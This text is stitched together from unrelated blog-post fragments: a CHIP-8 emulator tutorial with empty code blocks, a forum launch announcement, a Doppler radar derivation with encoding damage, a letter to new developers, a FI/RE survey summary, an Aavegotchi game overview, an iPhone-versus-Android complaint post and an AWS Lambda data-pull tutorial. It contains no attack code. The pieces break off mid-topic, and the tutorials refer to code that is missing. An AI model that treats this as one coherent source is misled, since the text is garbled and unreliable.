      | and dynamic allocs |
      |                    |
      |                    |
0xFFF |--------------------|
</code></pre></div></div> <p>You’ll notice there’s no explicit stack here. The program actually doesn’t have a stack to address, that’s only used by the interpreter to implement jumping to functions and back. With this in mind we can draw up a header.</p> <div><div><pre><code><span>// cpu_chip8.h</span>

</code></pre></div></div> <p>We use excplicit integer types to ensure values are over/underflowed correctly. We need to use 16-bit types for 12-bit values. We also have 16 digital input keys, which we store as either on or off within this class. When we hook up input, we’ll find a way to feed that into the class between cycles. The opcode is made easy by the fact that all CHIP-8 instructions are 2 bytes long.</p> <p>So that gives us 0xFFFF=64k possible instructions (though many are unused). We can actually store every possible instruction in a map so that when we fetch an opcode we are able to immediately execute it by calling the associated <code>Instruction</code> in <code>instructions_</code>. Since we don’t bind much data to the functions, which should be able to fit the entire instruction map in cache!</p> <p>Our <code>Initialize</code> function is where to set up the memory map described above:</p> <div><div><pre><code><span>// cpu_chip8.cpp</span>

The gist of it here is that we set everything to 0 and load things into memory that need to be loaded. The fontset here is a series of 16 built-in sprites that programs can reference as they want. We’ll go over how that memory forms sprites later on when we worry about graphics. Our goal is that once <code>Initialize</code> complete we’re set up to execute a user program.</p> <p>Let’s build out a basic <code>RunCycle</code> so that we have a better idea of out to write <code>BuildInstructionSet</code>. If you remember any basic computer architecture, a cycle has a few phases. First you fetch the instruction, then you decode it, then you execute it.</p> <div><div><pre><code><span>// cpu_chip8.cpp</span>

This requires more work in the initial set-up, but means we completely remove the instruction-decode phase on <code>RunCycle</code>.</p> <p>Let’s dig into the meat of the interpreter, <code>BuildInstructionSet</code>. I wont list the implementations for every function here, but you can find that in the <a href="https://github.com/rivergillis/chip-8">repository for this project</a>.

<p>It’s the year 2020 and we have the immense benefit of thousands of years of history, literature, and technological progress at our fingertips.</p>

<p>Why does this matter? Because with time comes context. Consideration and reconsideration. Deconstruction and reconstruction. Adaptation, further research, new findings, and new examination. Impact. Consequences. Lessons.</p>

<p>Anything old comes with context. Context is gold. Old is gold.</p>

<p>Context helps us evaluate things thoughtfully. It helps us debate things on their merits. In this way we can become better people—and a better people.</p>

<p>Without time, we lose context. Tweets received within seconds have virtually zero context. So what happens? Things are evaluated carelessly because there is no context for thoughtfulness. People attack each other because they don’t have any merits to debate. We become worse people—and a worse people.</p>

<p>Focusing on the immediate tip of the timeline of history—to this extreme—is nonsensical. <em>Now</em> is the least-understood moment in history. If we’re looking to become more informed, is <em>now</em> really the moment we should be examining to the degree we do?</p>

<p><em>Now</em> is a tornado of conjecture with little underlying value and much potential harm: hysteria.</p>

<p>I contend that there is more value in understanding the past in order to understand the present. As an experiment, I’m launching <a href="https://hystoria.100millionbooks.org/" target="_blank">Hystoria</a>, a reddit-like website for rediscovering ideas from the past.</p>

<p>I’ll be posting book snippets and other interesting tidbits I find on it as I work on 100 Million Books, and I hope you do too. You can upvote posts and comment on posts, and the best posts will float to the top.</p>

<p>So what’s different about Hystoria?</p>

<p><strong>Only items produced 5 years ago (or more) will be allowed on the site.</strong></p>

<p>Anything else will be removed. My hope is that this medium will harness the competitive, gamified dynamic of social media to resurface the best ideas of the past. Let’s see if that pans out. I’ll also be pointing people to Hystoria for all new book snippet suggestions.</p>

<p>The site is built with a free and open-source tool called <a href="https://github.com/LemmyNet/lemmy" target="_blank">Lemmy</a>, and I host the website myself—there’s no “big tech” involvement here. Moderation policies and terms of use will be determined if and when needed. Visit the site with an ad blocker and you’ll notice there are no ads or tracking on it either.</p>

<p>There’s another upside of this site: as you can see by the posting history of this blog, I don’t post very often. It’s been years since I last posted at all, in spite of collecting a lot of stuff worth sharing in the mean time. My excuse is that I have many things to post, and creating blog posts worth reading for each item I find would be a unreasonably onerous commitment. Posting on social media like Twitter or Facebook would be more practical but I don’t like the idea of building a following on those sites for their own sakes. I would much rather use them as conduits for sites I actually own. Hystoria enables that.</p>

<p>So I’ll post more on social sites now too. Follow on <a href="https://twitter.com/100millionbooks" target="_blank">Twitter</a>, <a href="https://facebook.com/l00millionbooks" target="_blank">Facebook</a>, and <a href="https://t.me/l00millionbooks" target="_blank">Telegram</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Doppler effect has been widely used in radar to measure the relative velocity between source and the target. The radar and lidar that use Doppler effect to measure relative velocities are called Doppler radar. Many autonomous or semi-autonomous machines, such as air-plane, autonomous vehicle, are often equipped with Doppler radar.</p>



<p>In this blog post, I would like to discuss the physics and mathematics of Doppler effect for Doppler radar.</p>

<h3 id="ordinary-radar">Ordinary Radar</h3>

<p>In the ordinary radar configurations, the transmitter of the radar sends out a wave, the wave hits a target object and gets reflected, a small portion of the reflected wave will be received by the receiver of the radar. By measuring the time gap between signal transmission and receipt $\Delta t$, we could determine the distance between the radar and the target object $r$ easily.</p><p>

\[\begin{align}
r &amp;= \frac{c \Delta t}{2} \\
\end{align}\]

</p><p>where $c$ is the wave velocity. Both radar and the target object could be moving. But as long as the wave velocity $c$ is much greater than the relative velocity between the radar and the target object $\Delta v$, the above equation holds.</p>



<p>The ordinary radar is also called time-of-flight radar.</p>

<h3 id="doppler-radar">Doppler Radar</h3>

<p>Different from ordinary radar, Doppler radar could also be used for measuring the the relative velocity between the radar and the target object $\Delta v$.</p>

<h4 id="doppler-effect">Doppler Effect</h4>

<p>Letâ€™s consider the Doppler effect in the simplest 1D scenario. The wave frequency that the receiver measured $f^{\prime}$ is</p><p>

\[\begin{align}
\lambda^{\prime} &amp;= \lambda - \frac{\Delta v}{f}  \\
&amp;= \frac{c}{f} - \frac{\Delta v}{f} \\
&amp;= \frac{c - \Delta v}{f} \\
&amp;= \frac{c}{f^{\prime}} \\
\end{align}\]

</p><p>where $c$ is the wave velocity, $f$ is the source wave frequency, $\Delta v$ is the relative velocity between the source and the target, $\Delta v &gt; 0$ when the source and the target are moving closer, $\Delta v &lt; 0$ when the source and the target are moving farther. Therefore,</p><p>

\[\begin{align}
f^{\prime} &amp;= \frac{c}{c - \Delta v} f \\
\end{align}\]

</p><p>Apparently, when the source and target are moving closer, i.e., $\Delta v &gt; 0$, $f^{\prime} &gt; f$; when the source and target are moving farther, i.e., $\Delta v &lt; 0$, $f^{\prime} &lt; f$.</p>



<p>The Doppler frequency $\Delta f$, which is the difference between the receiver frequency and the transmitter frequency is</p><p>

\[\begin{align}
\Delta f &amp;= f^{\prime} - f \\ 
&amp;= \frac{c}{c - \Delta v} f -f \\
&amp;= \frac{f \Delta v}{c - \Delta v} \\
\end{align}\]

</p>

<p>Assuming $c \gg \Delta v$, we have</p><p>

\[\begin{align}
\Delta f &amp;= \frac{f \Delta v}{c} \\
\end{align}\]

</p><p>The Doppler effect will also happen to a Doppler radar when the radar and the object are relatively moving. Letâ€™s still consider the simplest 1D scenario. The target object will reflect the wave transmitted from the source. In this case, the target object becomes the source of wave, and the radar becomes the target object since the radar has a receiver. The frequency of reflected wave will be the same as the frequency of the wave the target objects receives, which is $f^{\prime}$. Then the frequency of the wave measured from the receiver on the radar $f^{\prime\prime}$ will be</p><p>

\[\begin{align}
f^{\prime\prime} &amp;= \frac{c}{c - \Delta v} f^{\prime} \\
\end{align}\]

</p><p>Assuming $c \gg \Delta v$, the Doppler frequency $\Delta f$, which is the difference between the receiver frequency and the transmitter frequency is</p><p>

\[\begin{align}
\Delta f &amp;= f^{\prime\prime} - f \\ 
&amp;= (f^{\prime\prime} - f^{\prime}) - (f^{\prime} - f) \\
&amp;= \frac{f \Delta v}{c} + \frac{f \Delta v}{c} \\
&amp;= \frac{2 f \Delta v}{c} 
\end{align}\]

</p><p>With this mathematical relationship, by measuring the the Doppler frequency $\Delta f$ on the radar, we could determine the relative velocity between the radar and the target object easily.</p>

<h4 id="phase-shift">Phase Shift</h4>

<p>In practice, instead of measuring the Doppler frequency $\Delta f$, many Doppler radar measure phase shift $\Delta \varphi$.</p>



<p>Assuming $c \gg \Delta v$, the phase difference between the transmitted signal and the received signal, i.e., phase shift $\Delta \varphi$, is</p><p>

\[\begin{align}
\Delta \varphi &amp;= \frac{2r}{\lambda} 2\pi \\
&amp;= \frac{4 \pi r}{\lambda} \\
&amp;= \frac{4 \pi r f}{c} \\
\end{align}\]

</p><p>where $r$ is the distance between the radar and the target object, and $\lambda$ is the wavelength.</p><p>

\[\begin{align}
\frac{d \Delta \varphi}{dt} &amp;= \frac{4 \pi f}{c} \frac{d r}{dt} \\
&amp;= \frac{4 \pi f}{c} \Delta v \\
\end{align}\]

</p><p>Note that $\Delta v = \frac{d r}{dt}$.</p>



<p>This means that if we could measure $\frac{d \Delta \varphi}{dt}$, we could calculate the relative velocity between the radar and the target object. In practice, $\frac{d \Delta \varphi}{dt}$ could be measured easily by transmitting lots of signals in unit time, and measuring the $\frac{\Delta \Delta \varphi}{\Delta t}$.</p>

<h3 id="conclusions">Conclusions</h3>

<p>Doppler radar is not that sophisticated to understand. We determine the relative velocity by measuring the change rate of Doppler effect phase shift.</p>

		<p><em>This is a guest post from Cierra Nease. Enjoy.</em></p>
<p>Dear new developer,</p>
<p>“Failures” as a new developer are plenty — but you might be asking, why is “failures” in quotes? To fail something is dependent upon one’s perspective. The only true failure is to quit working towards success. Every failure brings a small success in that you learn what the right answer is not. How can you problem solve without a way of marking off solutions that do not work? A failure is simply a solution that didn’t work at that specific time.</p>
<p>We can all talk about how learning and growth come from having failures, but it’s hard to remember that when you feel like you are a failure. Failures do not inherently make the person a failure, and it can be hard to make that distinction in the moment. Sometimes we need someone else to remind us of this.</p>
<p>I’ve had a lot of people in life reiterate this concept to me. The most recent person was a fellow developer named Mike on the Denver light rail. It’s funny what will happen when people participate in communicating and interacting with each other, but that is for another blog post entirely. For now, let’s go back to Mike. Mike overheard me talking to another passenger about being in a bootcamp. When I finished my conversation, he handed me a card and said he’d love to answer any questions I have about becoming a developer. I elaborated on some of my bootcamp experience, which happens to be full of failures.</p>
<p>Mike expressed his number one piece of advice for any developer, telling me: “whatever you do, don’t be afraid to fail.” We started talking about this in depth, and it really resonated with me for the rest of the evening. As a new developer, you really only see senior developers’ successes. Each developer goes through their own learning process which does include failures.</p>
<p>The failures that lead to success don’t stop when you become a “better” developer. If you are looking for a point when you quit failing as a developer, then you are looking for the wrong thing. The more you fail, the more you learn. The more you learn, the more you grow. The more you grow, the better the developer you become.</p>
<p>As a newer developer, I look forward to all of the opportunities to learn, grow, and accept my failures as the wrong solution instead of accepting them as a personal characteristic.</p>
<p>Sincerely,</p>
<p>Cierra</p>

                <h3 id="who-makes-up-the-fi-re-movement">Who makes up the FI/RE Movement?</h3><p>Despite its relatively recent popularity, the FI/RE movement is still in many ways ambiguous. Who are these millionaires next door and what common traits are shared among them? Fortunately based off of data obtained from a survey conducted of nearly 1,400 individuals in the r/financialindependence subreddit, we can get a bit more insight into not only those who are pursuing FI/RE, but also those who have already achieved it. Special thanks to u/melonbalon for conducting the survey in the first place!</p><!--kg-card-begin: html--><!--kg-card-end: html--><figure><img src="https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--7-.png" alt="" srcset="https://www.thriftythoughts.io/content/images/size/w600/2020/12/UNCLAIMED-PROPERTY--7-.png 600w, https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--7-.png 800w" sizes="(min-width: 720px) 720px"></figure><h3 id="insights-obtained">Insights Obtained</h3><p>So much data was obtained as part of this survey and the figures reported in the above visual only scratch the surface of valuable insights that could be drawn. Of note however are a couple items:</p><ol><li><strong>Commute times are very low.</strong> Over 20% of respondents noted that it takes last than 10 minutes to get to work. Additionally, nearly 70% had a commute of less than 30 minutes. It's likely that these smaller commute times result in less transportation costs which could be a motivating factor.</li><li><strong>Individuals who have already FI/RE'd are highly educated.</strong> Not only did nearly 85% of respondents have a college degree, but an additional 7% had multiple graduate degrees. Perhaps these individuals have more time for additional schooling post-retirement. It also could be the case that this additional education helped them FI/RE in the first place. Regardless, more schooling was expected in comparison to the respondent group that had not yet FI/RE'd simply given the older average age. </li><li><strong>Respondents favored urban and suburban environments equally. </strong>Additionally this ratio remained constant in both the pursuing FI/RE and FI/RE'd populations. I would have expected far more suburban living, but perhaps the increased cost of living in an urban environment is offset enough by the reduced transportation costs to be appealing.</li></ol>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><hr><p><strong>Aavegotchi</strong> is a DeFi-enabled crypto collectibles game developed by Singapore-based Pixelcraft Studios that allows players to stake NFT avatars with interest-generating <a target="_blank" href="https://wiki.aavegotchi.com/atokens">aTokens</a> and interact with the Aavegotchi <a target="_blank" href="https://wiki.aavegotchi.com/metaverse">metaverse</a>.

Aavegotchis possess three attributes that determine their overall value and rarity within the Aavegotchi universe: <strong>collateral stake, traits, and wearables.</strong></p><ul><li><p><strong>Collateral stake:</strong>
Each Aavegotchi ERC721 NFT manages an escrow contract address that holds
an Aave-backed ERC20 collateral, or “aToken”. <a target="_blank" href="https://wiki.aavegotchi.com/atokens">aTokens</a> generate yield via
Aave’s LendingPool, which increases the quantity of aTokens held in the
wallet. Thus, the amount of aTokens held in the Aavegotchi’s escrow address grows over time.</p></li><li><p><strong>Traits:</strong>
Aavegotchis possess multiple traits that influence their rarity, their performance in mini-games, and the wearables they can equip. Some are generated randomly upon birth, and others depend on user interactions with the Aavegotchi. <strong>See <a target="_blank" href="https://wiki.aavegotchi.com/traits">Traits</a>.</strong></p><ul><li><p><strong>Random Traits</strong>: Upon birth, every Aavegotchi is assigned several random trait values using the ChainLink VRF random number generator. Trait values are distributed on a bell-curve, and each trait is assigned a value of Common, Uncommon, Rare, Legendary, or Mythical, depending on its rarity.</p></li><li><p><strong>Kinship</strong>: “Kinship” is not randomly assigned, but rather starts at a fixed value upon birth and increases or decreases based on various factors, such as how long the Aavegotchi has been with the same owner, and how often the owner interacts with it.</p></li><li><p><strong>Experience:</strong> Aavegotchis level up as they gain more experience by voting in AavegotchiDAO and participating in mini-games. Every few levels, Aavegotchis receive one Spirit Point that can be allocated towards increasing or decreasing a certain trait.</p></li></ul></li><li><p><strong>Wearables</strong>
In addition to managing the aToken escrow, Aavegotchis also extend the ERC998 Composables standard, which allows them to manage child NFTs, known as wearables in the Aavegotchi ecosystem.
Not every wearable can be equipped by every Aavegotchi. Some wearables may be exclusively equipped by Aavegotchis staked with certain collaterals, those of a certain level, and those with certain traits.
Some wearables can increase or decrease certain traits of an Aavegotchi. For example, equipping a sword may slightly boost an Aavegotchi’s aggressiveness, whereas equipping a Bob Marley shirt may decrease its energy level.</p></li></ul><h2 id="aavegotchi-value">Aavegotchi Value</h2><p>The valuation of an Aavegotchi comes from both from its intrinsic value and from its rarity value.</p><ul><li><p><strong>Intrinsic value</strong>
Intrinsic value is the denominated value of the Aavegotchi’s staked collateral. If the Aavegotchi is staked with 10 aDAI, then the intrinsic value would be 10 aDAI, plus whatever extra aDAI has accrued from the Lending Pool. Initially, only ERC20 tokens listed on the Aave platform (aTokens) will be available as collaterals. However, once AavegotchiDAO launches, the community will be able to vote on which new collaterals to allow.</p></li><li><p><strong>Rarity value</strong>
Rarity value is determined by calculating the rareness of each Aavegotchi’s traits and equipped wearables within the Aavegotchi universe. Unlike other NFT games, rarity is not a fixed value in Aavegotchi. It can change over time as Aavegotchis level up and equip different wearables. Thus, a rare Aavegotchi one week could become common, and vice versa, depending on the overall distribution of traits and wearables within the Aavegotchi universe. This enables a novel concept known as “rarity farming”, which is explained in more detail in the Aavegotchi official whitepaper to be released soon.</p></li></ul><h2 id="the-aavegotchi-universe">The Aavegotchi Universe</h2><p>The Aavegotchi Universe encompasses all the elements that allow Aavegotchis to operate, including Portals, the $GHST Utility Token, AavegotchiDAO, and the Aavegotchi Realm.</p></div></div></div>]]>

<p><strong>UPDATE: While these are valid reasons, <a href="https://www.arencambre.com/iphones-are-inferior-to-android-phones-the-value/">scoring them suggests I should still switch to the iPhone</a>.</strong></p>



<p>I am on day 10 of using an iPhone. I came from the Android world.</p>



<p>The iPhone is deficient. I am leaning towards returning it.</p>




<h2><span id="Context"></span>Context<span></span></h2>



<p>Ten days ago, I switched from a Pixel 4 XL to the iPhone 12 Pro Max. I went with this iPhone model because it’s similarly sized to the Pixel 4 XL, plus I value photography.</p>



<h3><span id="Why_I_switched"></span>Why I switched<span></span></h3>



<p>I made the switch due to intellectual curiosity, to overcome limitations of the Pixel 4 XL, and to get on board with the rest of my family.</p>



<p>I am questioning this decision. While the iPhone helps me escape two Pixel 4 XL limitations, iOS’s regressions from Android feel like a heavy burden.</p>



<p>I am inside Apple’s return window, so I can return the iPhone for a full refund. It is tempting.</p>



<h3><span id="Android_only_has_two_worthwhile_brands"></span>Android only has two worthwhile brands<span></span></h3>



<p>My analysis relies heavily on my experience with the Pixel 4 XL. Much of what I say about Android applies to to top-tier Android manufacturers. Among the requirements of top-tier manufacturers is they deliver highly vanilla Android. This includes <a href="https://store.google.com/us/magazine/compare_pixel">Pixel </a>(Google’s in-house brand), <a href="https://www.oneplus.com/">OnePlus</a>, and more.</p>



<p><strong>Samsung is not a top-tier phone manufacturer.</strong> Its hardware is decent, but it has bad software. Samsung replaces Android’s best features with <a href="https://www.samsung.com/us/support/answer/ANS00078945/">poor, fussy substitutes</a>. It also adds annoying, pointless bloat. In other words, just to differentiate its brand, it <em>devalues its brand </em>by trashing up its core software.</p>



<p>The Bixby assistant is the best example of Samsung’s stupidity. It’s awful. Samsung killing Bixby might signal that it’s ready to take Android seriously. Until then, Samsung is simply not a top-tier manufacturer.</p>



<p>The Samsung example is important because Apple is the same: <strong>great hardware, bad software</strong>.</p>



<h2><span id="A_note_about_definitions"></span>A note about definitions<span></span></h2>



<p>The article’s language is sometimes imprecise. Truly, if you’re comparing Android to something in the Apple ecosystem, it would be iOS. But that is not how people talk about their phones, so I am using loose terminology in places.</p>



<p>If you’re a True Nerd™ and find my word use upsetting, just associate my word with its parent ecosystem.</p>



<p>This is how several terms are correctly used:</p>



<figure><table><tbody><tr><td><strong>Word category</strong></td><td><strong>Android phone ecosystem</strong></td><td><strong>Apple phone ecosystem</strong></td></tr><tr><td>Operating system</td><td>Android</td><td>iOS</td></tr><tr><td>Manufacturers</td><td>Google, OnePlus, and more</td><td>Apple</td></tr><tr><td>Phone brand</td><td>Pixel (Google), OnePlus, and more</td><td>iPhone</td></tr><tr><td>Phone model (current generation)</td><td>For Pixel: Pixel 4A, Pixel 4A 5G, Pixel 5. For OnePlus: OnePlus 8T, OnePlus 8 Pro, OnePlus 8, OnePlus 7T. There are more current model from other manufacturers.</td><td>iPhone 12, iPhone 12 Mini, iPhone 12 Pro, iPhone 12 Pro Max, iPhone SE, and more</td></tr></tbody></table></figure>



<p>Also, some Android features I enjoy are Pixel-specific. While Google freely distributes Android to other manufactures, it reserves some newer features for its own Pixel phones. Sometimes I may mistakenly generalize a Pixel-specific feature as an Android feature. Since Pixel-specific features often eventually end up on other phones, associating Pixel with Android is probably correct in the long run.</p>



<h2><span id="Where_Android_is_better"></span>Where Android is better<span></span></h2>



<p>Android is well thought out. It has a great UX. I really miss its great design.</p>



<h3><span id="Call_screening_Android_wins"></span>Call screening: Android wins<span></span></h3>



<p>Android’s <a href="https://support.google.com/phoneapp/answer/9118387?hl=en">built-in call screener</a> is excellent. It blocks calls it is confident are garbage. If the caller is in a gray area, it will ask the caller first to state the reason for calling, then show that to me on the screen where I can accept the call. And even if does nothing to the call, I can still use a <strong>Screen Call </strong>button to kick the call to a digital assistant, where the caller is invited to state the reason for the call.</p>



<figure><img src="https://www.xda-developers.com/files/2019/11/call_screen_assistant.jpg" alt=""><figcaption>Example call-screen opportunity. (This image shamelessly <a href="https://www.xda-developers.com/automatic-call-screen-google-pixel-phones/">stolen</a> from XDA Developers.)</figcaption></figure>



<p><strong>NOTE:</strong> This may be mostly a Pixel feature right now. Google plans to <a href="https://www.androidpolice.com/2020/09/08/google-phone-will-soon-be-downloadable-from-play-store-verified-calls-feature-rolling-out/">extend</a> this to more Android brands. Because Samsung uses its own, poor quality dialer, it’s unclear how Samsung will get this feature.</p>



<p><strong>Why iPhone sucks:</strong> Apple only has a <a href="https://support.apple.com/en-us/HT207099">crude tool</a>: block callers not in your contacts. You can’t report calls or texts as spam.</p>



<p>If you want to be more selective than Apple’s crude tool, and instead block specific spammers, you must add the spammers to your contacts. That’s dumb; it just clutters your contacts!</p>



<p>You can also subscribe to a third party service. That’s grating, because the phone should manage that itself, given that this is a years-old problem.</p>



<h3><span id="Browser_ad_blocking_Android_wins"></span>Browser ad blocking: Android wins<span></span></h3>



<p>On Android, browser ad-blocking is easy: Switch to the free <a href="https://play.google.com/store/apps/details?id=org.mozilla.firefox&amp;hl=en_US&amp;gl=US">Mozilla Firefox browser</a>. Inside Firefox, add the free <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">uBlock Origin extension</a>. Then set Firefox as your default browser for happy browsing. Simple! (Android’s Chrome browser does not support extensions.)</p>



<p><strong>Why iPhone sucks:</strong> Install the <a href="https://apps.apple.com/us/app/adguard-adblock-privacy/id1047223162">AdGuard app</a>, jump through several fussy hoops in the <strong>Settings </strong>console’s <strong>Safari </strong>area, and get nagged about going to paid AdGuard. </p>



<p>Maybe I am fussing too much. The hassle is a one-time step, and AdGuard seems to work decently.</p>



<p>Part of the point of ad-blocking is to make YouTube worthwhile. That leads to my next point…</p>



<h3><span id="YouTube_ad_blocking_Android_wins"></span>YouTube ad blocking: Android wins<span></span></h3>



<p>To block YouTube’s ads on Android, just view all YouTube content in Firefox with the uBlock Origin extension. Easy!</p>



<p><strong>Why iPhone sucks:</strong> While Safari + AdGuard = ads blocked on YouTube, it’s still a major regression from Android:</p>



<ul><li>Video quality <a href="https://www.reddit.com/r/apple/comments/aom6ge/why_does_youtube_only_go_up_to_720p_on_mobile/">maxes out at 720p</a>.</li><li>Every YouTube video in Safari starts as low quality (360p). To change it, on <em>every video you watch</em>, you must wade through the settings menu, and it has to be done before you switch to full screen, because of the next bullet’s deficiency.</li><li>When you’re viewing a video in a browser and switch to full screen, Apple cancels the website’s native video player and forces you to use iOS’s default, bad, native video player. Want to double-tap and skip 10 seconds? Want to access the site’s in-video settings? Want any feature not supported by iOS’s dumbed down video control? Forget it! iOS nukes it in full-screen mode.</li></ul>



<p>Firefox Focus is not a solution. It doesn’t fix iOS’s deficiencies.</p>



<h3><span id="Universal_back_button_Android_wins"></span>Universal back button: Android wins<span></span></h3>



<p>For at least a decade, Android has had a back button at the bottom of all windows. This means the valuable concept of “take me back” is baked into the Android paradigm. Need to return where you were, in <em>any</em> app? Just tap the back button, on bottom left of the screen. Or use the back gesture (next section).</p>



<p><strong>Why iPhone sucks:</strong> The back button is a mess.</p>



<p>In Safari, it’s on bottom left.</p>



<p>In most other apps, top left.</p>



<p>To get to the prior app that sent you to the current app, find a tiny button between the app’s top-left back button and the clock. And good luck on that; too much of the time, iOS lists a wrong or irrelevant prior app, especially if you got to your current app from a system notification.</p>



<figure><img loading="lazy" width="1024" height="449" src="https://www.arencambre.com/wp-content/uploads/2020/12/image-1024x449.png" alt="" srcset="https://www.arencambre.com/wp-content/uploads/2020/12/image-1024x449.png 1024w, https://www.arencambre.com/wp-content/uploads/2020/12/image-300x132.png 300w, https://www.arencambre.com/wp-content/uploads/2020/12/image-768x337.png 768w, https://www.arencambre.com/wp-content/uploads/2020/12/image.png 1225w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Even though the mini back button says otherwise, I was not sent to GroupMe by NPR One! I was sent there by a notification I tapped while NPR One was active.</figcaption></figure>



<p>Even worse, because the non-Safari back buttons are on the opposite end of the phone from where you hold it, you’re less precise with finger positioning. Therefore, when you intend to use a “back” feature, you’ll instead make the phone think you’re trying to pull down the notification area.</p>



<h3><span id="Gestures_Android_wins"></span>Gestures: Android wins<span></span></h3>



<p>Building on its native strengths, Android’s <a href="https://support.google.com/pixelphone/answer/6073614?hl=en">gestures</a> are excellent. They edge out iOS with the back gesture, which I use a lot. No matter what app you’re in, swipe in from the phone’s right to go back. Simple!</p>



<p><strong>Why iPhone sucks:</strong> Without a “back” gesture, you’re stuck fumbling with iOS’s haphazard back buttons.</p>



<h3><span id="Exiting_apps_Android_wins"></span>Exiting apps: Android wins<span></span></h3>



<p>In Android, you can exit apps with the back gesture or swiping up from the bottom. The back gesture is superior, because it can’t be confused with other gestures.</p>



<p><strong>Why iPhone sucks:</strong> Your only choice is the swipe-up gesture, which sometimes conflicts with normal swipes one does in apps.</p>



<p><strong>NOTE: </strong>I don’t literally mean app-exiting in the computer-science sense. I mean more in a common-parlance sense: you’re out of the app and back to the home screen, or in another app that may have called the current app. One an app is no longer visible, and running in the background, Android and iOS both do fine managing it.</p>



<h3><span id="Ambient_display_Android_wins"></span>Ambient display: Android wins<span></span></h3>



<p>The Pixel has a great feature: even when you’re not using the phone, it shows the current time on the screen, along with some other useful information. This takes minimal power: thanks to the OLED screen, the main power use is when it lights up the specific pixels that show the time.</p>



<figure><img loading="lazy" width="768" height="1024" src="https://www.arencambre.com/wp-content/uploads/2020/12/image-1-768x1024.png" alt="" srcset="https://www.arencambre.com/wp-content/uploads/2020/12/image-1-768x1024.png 768w, https://www.arencambre.com/wp-content/uploads/2020/12/image-1-225x300.png 225w, https://www.arencambre.com/wp-content/uploads/2020/12/image-1-1152x1536.png 1152w, https://www.arencambre.com/wp-content/uploads/2020/12/image-1-1536x2048.png 1536w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Ambient display. This Pixel 4 XL is not active. It’s basically in sleep mode. It uses minimal power to give me useful information on its OLED screen.</figcaption></figure>



<p><strong>Why iPhone sucks:</strong> While the iPhone also has an OLED screen, Apple has no similar feature. You have to tap the phone to see the time, which lights up the whole screen.</p>



<h3><span id="Treating_me_like_an_adult_Android_wins"></span>Treating me like an adult: Android wins<span></span></h3>



<p>Android’s UX language is simply clean. It’s intuitive, simple, and it just works.</p>



<p><strong>Why iPhone sucks:</strong> iOS’s UX feels like a cartoon spoof of a phone OS. Naturally garish colors, toddler-like corner-rounding, goofy font sizes, etc. It’s like iOS’s design semantics were intended to tussle with our innate senses. Barf!</p>

<p>All newly installed Android apps go into the app drawer. This is an alphabetized list of apps, accessed by swiping up from a home screen (when you’re not inside an app).</p>

<p>If you are looking for a simple, cheap data pipeline to pull small amounts of data from a stable API and store it in a cloud storage, then <code>serverless functions</code> are a good choice. This post aims to answer questions like the ones shown below</p>
<blockquote>
<p>My company does not have the budget to purchase a tool like <code>fivetran</code>, What should I use to pull data from an API ?</p>
</blockquote>
<blockquote>
<p>Do I really need an orchestration tool like Airflow for one simple data pull from an API ?</p>
</blockquote>
<p>In the post we cover what a <code>serverless</code> function can and cannot do, what its pros and cons are and walk through a simple API data pull project.</p>

<p>Chances are that you have heard of the term <code>serverless</code>. The term <code>serverless</code> may be misleading. In fact, there is a server on which your code will be running. <code>Serverless</code> refers to the fact that you do not have to manage any servers, but just the code. We will use <code>AWS Lambda</code> for this simple project. <a href="https://aws.amazon.com/lambda/?c=ser&amp;sec=srv"><code>AWS Lambda</code></a> can be used to run a function without having to provision and maintain a server.</p>
<p>You write a function and deploy it to AWS Lambda. There you can set the function to run based on <a href="https://aws.amazon.com/blogs/architecture/understanding-the-different-ways-to-invoke-lambda-functions/">external triggers</a>. The lambda function will execute the logic and end. Note that you will have a limited time (current max execution time for lambda code execution is 15min) for your code logic to complete. There is also a limit on the memory size(current max is at 3.008GB). In this post we will</p>
<ol>
<li>Start the lambda function.</li>
<li>Download data from a dummy API to local file system.</li>
<li>Copy the downloaded files to AWS S3.</li>
<li>Stop the lambda function.</li>
<li>The lambda function will be scheduled to run every 5 minutes.</li>
</ol>
<p><img src="https://www.startdataengineering.com/images/pull-data-from-API-using-lambda-s3/api_data_pull.png" alt="Simple API Data Pull"></p>

<p>Let’s assume you work for a company that wants to pull some data from an API that you have access to and assess the quality of that data. Your responsibility is to pull this data and make it available via cloud storage for other systems to consume and assess quality. Let’s assume that this is your first and only data pull(for now). There is not enough time/ money to set up/buy a data orchestration tool. This project is to validate the value that this data may provide, based on which your company can choose to either continue paying for this data or not.</p>

<h3 id="prerequisites">Prerequisites</h3>
<ol>
<li><a href="https://aws.amazon.com/">AWS Account</a></li>
<li>AWS CLI <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html">installed</a> and <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html">configured</a></li>
</ol>
<h3 id="api-documentation">API Documentation</h3>
<p>Let us assume that our API has the following documentation.</p>
<ol>
<li>API endpoint: GET <code>http://jsonplaceholder.typicode.com/posts</code> to get user post data.</li>
<li>Query parameters: The data returned from the API is sorted by user_id. Using <code>start_user_id</code> and <code>end_user_id</code> we can query for a range of data based on user ids.</li>
<li>API metadata endpoint: GET <code>http://jsonplaceholder.typicode.com/number_of_users</code>, will return the total number of user posts.</li>
</ol>
<p>The GET endpoint will return a list of JSON with the format</p>
<div><pre><code data-lang="json">{
    <span>"userId"</span>: <span>1</span>,
    <span>"id"</span>: <span>1</span>,
    <span>"title"</span>: <span>"some title here"</span>,
    <span>"body"</span>: <span>"some test here"</span>
}
</code></pre></div><h2 id="paginate">Paginate</h2>
<p>When pulling a “lot” of data from an API, it is general best practice to make multiple requests to pull data in chunks. The definition of a lot of data depends on the amount of data being pulled and the API stability. Based on the <code>API Documentation</code> above, we need to</p>
<ol>
<li>Get the total number of user posts.</li>
<li>Split the number into N number of calls, depending on a predefined <code>CHUNK</code> size. Which is the amount of data you want to pull per API call.</li>
<li>Make the API call, pull the data and write it to a local disk storage. You can also store in memory if the data size is sufficiently small.</li>
<li>Some APIs may fail due to network or other issues, add a retry parameter to account for this. In reality this will depend on the stability of the API and the network.</li>
</ol>
